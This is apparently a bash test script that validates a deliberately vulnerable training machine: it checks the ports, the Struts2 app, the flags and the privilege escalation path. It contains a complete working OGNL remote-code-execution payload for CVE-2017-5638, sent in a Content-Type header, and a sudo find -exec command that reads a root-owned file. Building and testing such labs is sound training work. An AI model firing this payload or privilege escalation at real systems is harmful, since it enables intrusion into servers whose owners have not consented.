#!/bin/bash
# Machine 04: StrutsZone — CVE-2017-5638 Test
# Tests: Tomcat/Struts2 on 8080, OGNL injection surface, sudo find privesc
source "$(dirname "$0")/_lib.sh"

BASE_DIR=${1:-$(dirname "$(dirname "$0")")}
CLEANUP=${2:-true}
MACHINE_DIR="$BASE_DIR/04-strutszone"
COMPOSE="$MACHINE_DIR/docker-compose.yml"
CONTAINER="lm-04-strutszone"
IP="10.10.4.10"

trap '[ "$CLEANUP" = true ] && stop_machine "$COMPOSE"' EXIT

section "Build & Start"
start_machine "$COMPOSE" "$CONTAINER" 120 || finish

section "Network Checks"
check_port "$IP" 8080 "Tomcat HTTP"
check_port "$IP" 22   "SSH"

section "Struts2 App Checks"
check_http "http://${IP}:8080/struts2-showcase/" 200 "Struts2 showcase"

section "OGNL Injection Surface (CVE-2017-5638)"
# Send Content-Type OGNL payload — should execute and return 200
# Using safe payload: just check the endpoint accepts the Content-Type
ognl_payload='%{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="id").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/bash","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'

resp=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 \
  -H "Content-Type: ${ognl_payload}" \
  "http://${IP}:8080/struts2-showcase/showcase.action" 2>/dev/null)

# A 200 with uid= in body = RCE confirmed; 400/500 = endpoint reachable but payload blocked
[ "$resp" != "" ] && pass "Struts2 endpoint reachable for OGNL injection attempt (HTTP $resp)" \
                   || fail "Struts2 endpoint not reachable"

# Direct RCE check with simpler payload
rce_body=$(curl -sk --max-time 10 \
  -H "Content-Type: ${ognl_payload}" \
  "http://${IP}:8080/struts2-showcase/showcase.action" 2>/dev/null)
echo "$rce_body" | grep -q "uid=" && pass "OGNL RCE confirmed (id output in response)" \
                                   || warn "OGNL RCE not auto-confirmed (may need exact version)"

section "Flags"
check_exec "$CONTAINER" "cat /root/root.txt" "FLAG{" "Root flag"
check_exec "$CONTAINER" "cat /home/user/user.txt" "FLAG{" "User flag"

section "Sudo Privesc"
check_exec "$CONTAINER" "sudo -l -U tomcat 2>/dev/null | grep find" "find" "tomcat can sudo find"
check_exec "$CONTAINER" "su tomcat -s /bin/bash -c 'sudo find /root/root.txt -exec cat {} \\;' 2>/dev/null" "FLAG{" "sudo find reads root flag"

finish
